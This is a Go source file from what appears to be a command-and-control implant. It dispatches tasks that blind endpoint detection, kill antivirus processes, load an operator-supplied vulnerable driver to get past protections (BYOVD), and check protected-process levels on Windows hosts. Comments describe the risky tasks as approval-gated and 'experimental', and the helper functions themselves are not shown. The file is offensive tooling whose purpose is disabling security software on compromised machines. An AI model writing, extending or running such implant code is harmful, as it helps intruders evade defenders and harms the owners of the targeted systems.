//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"runtime"
	"strings"
)

// EDR pack handlers (experimental). edr_blind/edr_kill/byovd_load are
// approval-gated server-side (dangerousTaskTypes); ppl_check is read-only
// recon. All four are Windows-only; non-Windows agents report that plainly.

func handleEDRBlind(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "edr_blind is Windows-only"
		return
	}
	res.Output = edrBlind()
}

func handleEDRKill(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "edr_kill is Windows-only"
		return
	}
	out, err := killAV()
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = "[edr_kill experimental] " + out
}

func handleBYOVDLoad(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "byovd_load is Windows-only"
		return
	}
	// command: driver_path[|service_name]. The driver binary is always
	// operator-supplied — the implant ships no vulnerable-driver bytes.
	arg := strings.TrimSpace(task.Command)
	if len(arg) > 512 {
		arg = arg[:512]
	}
	driverPath, svcName := arg, ""
	if i := strings.Index(arg, "|"); i >= 0 {
		driverPath = strings.TrimSpace(arg[:i])
		svcName = strings.TrimSpace(arg[i+1:])
	}
	if driverPath == "" {
		res.Error = "format: driver_path[|service_name]"
		return
	}
	out, err := byovdLoadDriver(driverPath, svcName)
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = out
}

func handlePPLCheck(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "ppl_check is Windows-only"
		return
	}
	res.Output = pplProtectionLevel()
}
